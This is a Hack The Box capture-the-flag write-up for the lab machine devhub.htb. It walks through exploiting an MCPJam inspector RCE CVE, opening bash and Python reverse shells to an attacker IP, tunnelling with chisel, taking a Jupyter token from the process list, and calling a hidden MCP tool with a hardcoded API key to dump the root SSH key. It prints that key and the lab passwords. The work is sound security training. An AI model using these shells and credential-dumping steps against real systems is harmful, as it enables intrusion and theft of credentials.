```bash
 ════════════════════════════════════════════════════════
  RECON SUMMARY                                           
  ════════════════════════════════════════════════════════

  Target:        10.129.13.15
  DNS:           devhub.htb
  HTTP:          80 6274
  HTTPS:         none
  Generated:     2026-06-02 11:47:25

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
  80/tcp       open       http             nginx 1.18.0 (Ubuntu)
  6274/tcp     open       unknown          

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (0 found)
  ────────────────────────────────────────────────────────
  none

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (2 found)
  ────────────────────────────────────────────────────────

  [ http://devhub.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  200      /

  [ http://devhub.htb:6274 ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  200      /health

  ════════════════════════════════════════════════════════

=== Done! Results: /home/kali/github/ctf_tool/results/devhub.htb/ ===
```

We have a few ports open. Ssh and 2 http websites. The website on port 6273 is mcp inspector. Its a model context protocol development and debugging tool. 

I remember a previous mcp inspector having a cve that we exploited. 
From the settings we are able to see that we version of mcpJAM is v1.4.2

```bash
 CVE-2026-23744 Detail
Description

MCPJam inspector is the local-first development platform for MCP servers. Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request. Version 1.4.3 contains a patch.
```
Lets get a poc from github

```bash
python3 exploit.py 10.129.13.15 'curl 10.10.15.204:4444'
[*] Waiting for server to start on port 6274...
[+] Server is up and running.
[*] Sending exploit payload...
[*] Request failed (this might be expected if the command execution interrupts the connection): HTTPConnectionPool(host='10.129.13.15', port=6274): Read timed out. (read timeout=5)
[+] Payload sent.
                                                                                                                    
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.204] from (UNKNOWN) [10.129.13.15] 51730
GET / HTTP/1.1
Host: 10.10.15.204:4444
User-Agent: curl/7.81.0
Accept: */*
```

We have successful RCE. Let's just make it into a succesfull shell.

```bash
bash -c "bash -i >& /dev/tcp/10.10.15.204/4444 0>&1
```

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.204] from (UNKNOWN) [10.129.13.15] 43760
bash: cannot set terminal process group (1078): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

That was incredibly easy. Im pretty afraid how the rest will be. 

After enumerating for a while i remembered this from the main page.

```bash

Analytics Dashboard

Jupyter-based analytics environment for data processing and visualization. Access restricted to analyst team.
Internal Only - localhost:8888 
```

And the other user is analyst. Maybe we can privesc through this. we will see. lets port forward it to our machine

We are going to use chisel
I installed it on my machine and transfered the binary over via http.server

```bash
chisel server --reverse -p 8000                                                       
2026/06/02 13:08:18 server: Reverse tunnelling enabled
2026/06/02 13:08:18 server: Fingerprint F6NsM/2cl75puHrZidcy9kaheE6HeH7p7GiYApzMkQs=
2026/06/02 13:08:18 server: Listening on http://0.0.0.0:8000
2026/06/02 13:08:56 server: session#1: tun: proxy#R:8888=>8888: Listening


./chisel client 10.10.15.204:8000 R:127.0.0.1:8888
2026/06/02 17:08:56 client: Connecting to ws://10.10.15.204:8000
2026/06/02 17:08:57 client: Connected (Latency 41.007859ms)
```

Now we are able to access it from our machine on localhost:8888

```bash
If no password has been configured, you need to open the server with its login token in the URL, or paste it above. This requirement will be lifted if you enable a password. 
```
We can get the tokin from the ps aux

```bash
analyst     1077  0.0  2.4 183072 97596 ?        Ss   04:36   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bi
n/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8
e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False 
```

Now we are inside the jupyter notebook which is familiar from all the uni classes and such.
I'm not aware of how we get a shell from this but im quite sure its possible since we are able to run scripts

```bash
import os,pty,socket;s=socket.socket();s.connect(("10.10.15.204",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
```
I make the following script and run it and we get shell as analyst.

```bash
┌──(kali㉿kali)-[~/github/ctf-writeups/hackthebox_writeups]
└─$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.15.204] from (UNKNOWN) [10.129.13.15] 45742
analyst@devhub:~/notebooks$ id 
id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

We are able to get the user.txt
Now let's start seaching for a way to get a root shell

```bash
    if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })

        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
```

in the script there seems to be a way to dump the root ssh key
We have to find a way to execute this

```bash
@app.route('/')                                                                                                                      
def index():                                                                                                                         
    return jsonify({                                                                                                                 
        "server": "OPSMCP",                                                                                                          
        "version": "2.1.0",                                                                                                          
        "status": "operational",                                                                                                     
        "endpoints": ["/tools/list", "/tools/call", "/health"],                                                                      
        "auth": "Required - X-API-Key header"                                                                                        
    })   


                                                                                                                                     
# Hidden tools (not in /tools/list but callable)                                                                                     
HIDDEN_TOOLS = {                                                                                                                     
    "ops._admin_dump": {                                                                                                             
        "description": "Emergency credential dump - INTERNAL ONLY",                                                                  
        "parameters": {"target": "string", "confirm": "boolean"}                                                                     
    },                                                                                                                               
    "ops._debug_mode": {                                                                                                             
        "description": "Enable debug mode",                                                                                          
        "parameters": {}                                                                                                             
    }                                                                                                                                
}     

```

We have to find a way to get a valid API-key

```bash
# API Key for authentication                                                                                                         
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a" 
```

We find it from the script. Now let's get the root key

```bash
analyst@devhub:/opt/opsmcp$ curl localhost:5000
curl localhost:5000
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
analyst@devhub:/opt/opsmcp$ curl localhost:5000/tools/list
curl localhost:5000/tools/list
{"error":"Unauthorized","message":"Valid X-API-Key header required"}
```

```bash
analyst@devhub:/opt/opsmcp$ curl -X POST http://localhost:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {"confirm":"true"}
  }'
{"error":"Invalid target","valid_targets":["ssh_keys","passwords","tokens"]}
``` 

Ok we are very close.

```bash
/opt/opsmcp$ curl -X POST localhost:5000/tools/list -H "X-API-Key:opsmcp_secret_key_4f5a6b7c8d9e0f1a" {"tool_name": "ops._admin_dump"}alhost:5000/tools/list -H "X-API-Key:opsmcp_secret_key_4f5a6b7c8d9e0f1a" {"tool_name": "ops._admin_dump"}




curl -X POST http://localhost:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {"confirm":"true", "target": "ssh_keys"}
  }'
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
curl: (3) unmatched brace in URL position 1:
{tool_name:
 ^
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```
Ok finally. That syntax took a while to figure out.

Now we just copy the key over then chmod 600 and then we can log in as root to the target

```bash
┌──(kali㉿kali)-[~]
└─$ nano id_rsa
                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa 
                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ ssh root@10.129.13.15 -i id_rsa
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Jun  2 06:19:38 PM UTC 2026

  System load:           0.0
  Usage of /:            84.1% of 9.50GB
  Memory usage:          28%
  Swap usage:            0%
  Processes:             242
  Users logged in:       0
  IPv4 address for eth0: 10.129.13.15
  IPv6 address for eth0: dead:beef::a0de:adff:fe72:431b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Tue Jun 2 18:19:39 2026 from 10.10.15.204
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devhub:~# 
```




